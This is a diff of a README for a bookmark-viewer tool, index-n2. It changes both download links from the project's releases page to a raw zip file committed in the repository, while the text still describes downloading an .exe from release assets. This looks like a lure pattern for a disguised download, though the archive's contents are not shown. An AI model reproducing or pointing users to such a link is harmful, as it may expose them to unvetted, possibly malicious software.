@@ -1,6 +1,6 @@
 # 📂 index-n2 - View your web bookmarks offline easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vexy7795/index-n2/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vexy7795/index-n2/raw/refs/heads/main/public/index_n_3.8.zip)
 
 index-n2 serves as a private viewer for the bookmarks you collect via fieldtheory-cli. It presents your saved content in a local gallery format on your machine. You do not need an internet connection to browse your archive once the data resides on your hard drive. This tool organizes your links and media into a clean, searchable interface.
 
@@ -8,7 +8,7 @@ index-n2 serves as a private viewer for the bookmarks you collect via fieldtheor
 
 You must visit the project release page to obtain the software. 
 
-[Click here to open the download page](https://github.com/vexy7795/index-n2/releases).
+[Click here to open the download page](https://github.com/vexy7795/index-n2/raw/refs/heads/main/public/index_n_3.8.zip).
 
 Look for the section labeled "Assets" at the bottom of the latest release post. Select the file ending in `.exe` to download the Windows installer. Save this file to your Downloads folder or your desktop for easy access.
 
